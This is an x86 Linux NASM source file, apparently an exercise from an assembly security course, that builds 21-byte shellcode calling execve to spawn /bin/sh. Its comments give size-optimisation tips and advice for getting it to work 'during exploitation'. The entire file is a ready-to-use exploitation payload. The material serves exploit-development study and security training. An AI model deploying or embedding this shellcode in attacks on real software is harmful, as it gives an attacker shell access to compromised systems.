; Filename: execve.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com
;
; Purpose:
;	execve a /bin/sh shell.
;
; Shellcode is 21 bytes.
;
; I can not think of a single thing I could do from here to
; make this shellcode smaller that would not compromise
; the stability of the shellcode.
;
; As always, if you know the values of EAX and ECX going
; in to the shellcode you can save yourself a byte or two
; at the beginning by removing the xor/ mul connection.
;
; If you have trouble with your environment pointer during
; exploitation simply uncomment the cdq command to clear
; EDX at the beginning.
;
; A lot of people go to the effort of setting the second
; call to execve. No idea why ;)
;

global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	;cdq

	push eax		; push null
	push 0x68732f6e		; hs/n
	push 0x69622f2f		; ib//
	mov ebx, esp		; execve( ebx, 0, 0 );
	mov al, 0x0b		; syscall 11 (execve)
	
	int 0x80
